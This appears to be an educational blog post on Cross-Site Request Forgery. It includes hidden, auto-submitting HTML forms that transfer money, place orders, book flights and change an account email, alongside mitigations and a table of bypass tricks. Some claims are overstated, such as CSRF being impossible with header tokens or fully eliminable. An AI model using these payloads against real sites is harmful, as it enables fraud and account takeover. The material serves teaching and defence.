---
title: "Understanding CSRF Vulnerabilities: From Basics to Real-World Exploits"
published: 2025-05-05
description: 'Exploring Cross-Site Request Forgery (CSRF) attacks, their exploitation in various scenarios, and mitigation strategies.'
image: 'CSRF.jpeg'
tags: [Web Security]
category: 'Client-Side Attacks'
draft: false 
lang: 'ar-eng'
---

## Table of Contents

* [Pre-conditions for CSRF to work](#pre-conditions-for-csrf-to-work)
* [What is CSRF?](#what-is-csrf)
* [How Does CSRF Work? (Intermediate Level)](#how-does-csrf-work-intermediate-level)

  * [Basic Attack Flow](#basic-attack-flow)
* [Example of CSRF Attack (Practical)](#example-of-csrf-attack-practical)
* [GET vs POST in CSRF](#get-vs-post-in-csrf)
* [CSRF Attack on an E-Commerce Site (Placing an Order)](#csrf-attack-on-an-e-commerce-site-placing-an-order)

  * [Mitigation](#mitigation)
* [CSRF in a Travel Booking Website (Booking a Flight)](#csrf-in-a-travel-booking-website-booking-a-flight)

  * [Mitigation](#mitigation-1)
* [CSRF in a Real Estate Website (Property Listing Creation)](#csrf-in-a-real-estate-website-property-listing-creation)

  * [Mitigation](#mitigation-2)
* [CSRF Attack on a Gaming Platform (Account Settings Modification)](#csrf-attack-on-a-gaming-platform-account-settings-modification)

  * [Mitigation](#mitigation-3)
* [Token Flaws](#token-flaws)
* [Case: YouTube (2008)](#case-youtube-2008)
* [CSRF in SPAs and REST APIs](#csrf-in-spas-and-rest-apis)
* [SameSite Cookie Behavior in Practice](#samesite-cookie-behavior-in-practice)
* [Bypassing Weak CSRF Protections](#bypassing-weak-csrf-protections)

---

### Pre-conditions for CSRF to work:

| Requirement               | Why it's needed                                    |
| ------------------------- | -------------------------------------------------- |
| Victim is authenticated   | So the browser has a session cookie for the target |
| No CSRF protections       | So the server doesn't validate request origin      |
| Browser sends credentials | Cookies must be automatically attached by browser  |

## What is CSRF?

**Cross-Site Request Forgery (CSRF)** is a type of web security vulnerability that allows an attacker to trick a user into performing actions they didn’t intend to do, **while they are authenticated** on a web application.

> Simple Analogy: Imagine you’re logged into your bank account in one browser tab. In another tab, you visit a malicious website. That website secretly sends a money transfer request to your bank using your browser’s cookies—without your permission. If the bank doesn't verify whether the request is legitimate, the transfer goes through.

## How Does CSRF Work? (Intermediate Level)

To understand CSRF, you need to understand **how browsers handle authentication**:

* When you log into a website, a **session cookie** is stored in your browser.
* That cookie is **automatically sent** with every request to that website.
* If the server doesn’t ask for more proof (like a token), it assumes the request is legitimate.

### Basic Attack Flow

1. The victim logs into `https://bank.com`.
2. The victim’s browser stores an **authentication cookie** for that site.
3. While logged in, the victim visits a malicious site `https://evil.com`.
4. `evil.com` contains HTML or JavaScript that sends a **forged request** to `https://bank.com/transfer?to=hacker&amount=1000`.
5. The browser **automatically includes the session cookie**, making the request look like it came from the user.

---

## Example of CSRF Attack (Practical)

```jsx
<!-- Evil page hosted on evil.com -->
<html>
  <body>
    <form action="https://bank.com/transfer" method="POST" style="display:none;">
      <input type="hidden" name="to" value="attacker_account">
      <input type="hidden" name="amount" value="1000">
      <input type="submit">
    </form>

    <script>
      document.forms[0].submit(); // Automatically submits the form
    </script>
  </body>
</html>
```

This will execute a **bank transfer** request on behalf of the victim without their knowledge.

## GET vs POST in CSRF

* CSRF can exploit **both GET and POST** requests.
* GET-based CSRF is easier to execute using `<img src="...">` or `<script src="...">`.
* POST-based CSRF requires **auto-submitting forms** or sometimes JavaScript (unless blocked by CORS).

## CSRF Attack on an E-Commerce Site (Placing an Order)

### Scenario:

An attacker exploits a **CSRF vulnerability** on an e-commerce platform where the user is logged in. The attacker wants to place an order on behalf of the victim.

**Attack Flow:**

1. The victim logs into `https://shop.com` and has an active session with a stored authentication cookie.
2. The attacker crafts a malicious HTML form that places an order for an expensive product (e.g., **\$1000 laptop**).

```jsx
<form action="https://shop.com/place-order" method="POST" style="display:none;">
  <input type="hidden" name="product" value="expensive-laptop">
  <input type="hidden" name="quantity" value="1">
  <input type="hidden" name="shipping_address" value="attacker_address">
  <input type="submit">
</form>

<script>
  document.forms[0].submit();  // Form is submitted automatically when victim visits page
</script>
```

1. The victim visits `https://evil.com`, and **the form is automatically submitted** without the victim’s knowledge.
2. **A new order** is placed for the laptop, and **the payment is charged to the victim's account**.

**Key Issues**:

* Lack of CSRF protection.
* No **confirmation step** or verification for actions like order placement.
* The use of **cookies** for authentication, making it easier for attackers to exploit.

### Mitigation

* **CSRF tokens** for every form that initiates an action (e.g., placing an order).
* **Order confirmation** page with user review before processing orders.
* **SameSite cookies** to restrict cross-origin requests.

---

## CSRF in a Travel Booking Website (Booking a Flight)

### Scenario:

A travel booking site that allows users to book flights has a CSRF vulnerability in its **booking form**.

**Attack Flow:**

1. The victim logs into `https://travelbooking.com` and the browser stores the session cookie.
2. The attacker creates a malicious website at `https://malicious.com` that contains a **form to book a flight**.

```jsx
<form action="https://travelbooking.com/book-flight" method="POST" style="display:none;">
  <input type="hidden" name="flight_id" value="1234">
  <input type="hidden" name="departure" value="Los Angeles">
  <input type="hidden" name="destination" value="Paris">
  <input type="hidden" name="date" value="2025-12-20">
  <input type="submit">
</form>

<script>
  document.forms[0].submit();
</script>
```

1. The victim visits the malicious website. The form is **automatically submitted** to the **travel site**, and the victim’s browser sends the **session cookie**.
2. The **flight is booked** without the victim's consent, and the attacker can use the **credit card details** linked to the victim’s account.

### Mitigation

* **CSRF token** with each form submission.
* Use **SameSite cookies** for session management.
* Confirm **important actions** like booking with a second factor of authentication.

---

## CSRF in a Real Estate Website (Property Listing Creation)

### Scenario:

An attacker exploits a CSRF vulnerability in a **real estate site** where users can **create property listings**.

**Attack Flow:**

1. The victim logs into `https://realestate.com` and is authenticated.
2. The attacker visits `https://malicious.com` and embeds a hidden form that **creates a property listing** on the real estate site:

```jsx
<form action="https://realestate.com/create-listing" method="POST" style="display:none;">
  <input type="hidden" name="property_type" value="villa">
  <input type="hidden" name="price" value="1000000">
  <input type="hidden" name="location" value="123 Fake Street">
  <input type="submit">
</form>

<script>
  document.forms[0].submit();
</script>
```

1. The victim visits `https://malicious.com` while logged into the real estate site. The **form is automatically submitted**, creating a **fake listing** under the victim’s account.
2. The attacker can then use the **fake listing** to scam users.

### Mitigation

* Ensure **CSRF token** is required for creating or modifying listings.
* Implement **account verification** for adding new listings.
* Use **SameSite cookies** to restrict cross-origin attacks.

---

## CSRF Attack on a Gaming Platform (Account Settings Modification)

### Scenario:

An attacker exploits a CSRF vulnerability in an online gaming platform where users can **modify their account settings** (e.g., changing the email address or password).

**Attack Flow:**

1. The victim is logged into `https://gamingplatform.com` and has a session cookie.
2. The attacker crafts a malicious page that submits a request to change the victim’s email.

```jsx
<form action="https://gamingplatform.com/update-email" method="POST" style="display:none;">
  <input type="hidden" name="email" value="attacker@example.com">
  <input type="submit">
</form>

<script>
  document.forms[0].submit();  // Automatically submits the form
</script>
```

1. The victim visits the malicious website, and the form is **submitted automatically**, changing the victim’s **email address** to the attacker’s email.
2. **Account recovery** becomes impossible for the victim, as the attacker now controls the email.

### Mitigation

* Implement **CSRF tokens** for form submissions involving sensitive data changes.
* **Email verification** for changes to critical account settings (e.g., email, password).

## Token Flaws

Here are common CSRF token flaws:

| Flaw                          | Description                             |
| ----------------------------- | --------------------------------------- |
| Same token for every user     | Allows attacker to reuse it             |
| Token in GET                  | May leak in browser history or logs     |
| Token not validated on server | Common in legacy apps                   |
| Token reused across sessions  | Allows token replay attacks             |
| Token not bound to user       | If attacker can guess it, CSRF succeeds |

## Case: YouTube (2008)

An attacker discovered that YouTube didn’t protect sensitive POST requests. They crafted a request that made **users auto-subscribe to a specific channel** when visiting a malicious site.

Result: **Millions of auto-subscribed users** before patching.

---

## CSRF in SPAs and REST APIs

### CSRF in Modern Web Apps (React, Angular, etc.)

Even though SPAs often use `fetch()` and APIs, they’re **not immune** to CSRF **if cookies are used for auth**.

### Key Points:

* If your app uses **session-based auth with cookies**, you **must protect** with CSRF tokens or SameSite settings.
* If using **token-based auth (JWT in Authorization header)**, then **CSRF is not possible** because browsers don’t attach Authorization headers cross-origin unless **CORS** is configured insecurely.

---

## SameSite Cookie Behavior in Practice

Testing Example

```jsx
document.cookie = "test=123; SameSite=Strict";
fetch("https://example.com/api/submit", {
  method: "POST",
  body: JSON.stringify({ data: "test" }),
  credentials: "include"
});
```

* With `SameSite=Strict`: Cookie **won’t be sent** in this cross-origin request.
* With `SameSite=None; Secure`: Cookie **will be sent**, unless blocked by browser settings.

> Common mistake: Devs set SameSite=None without Secure. This invalidates the cookie in modern browsers!

---

## Bypassing Weak CSRF Protections

### Common bypass tricks:

| Method                                      | Explanation                                                             |
| ------------------------------------------- | ----------------------------------------------------------------------- |
| Using image tags to bypass form protections | `<img src="...">`                                                       |
| Reusing leaked or shared tokens             | If tokens are not per-session or leak in URLs                           |
| Exploiting CORS misconfigurations           | With `Access-Control-Allow-Origin: *` and `credentials: true`           |
| JSON endpoints without proper headers       | APIs using cookies may be vulnerable if CORS or CSRF tokens are missing |

CSRF is simple in concept but powerful in impact. It thrives when:

* Authentication is handled via cookies
* State-changing actions lack validation
* The server trusts all incoming requests from the browser

With proper tokenization, cookie flags, and development hygiene, **you can eliminate the threat of CSRF completely**.

---

**`Happy Hacking Broo`**

---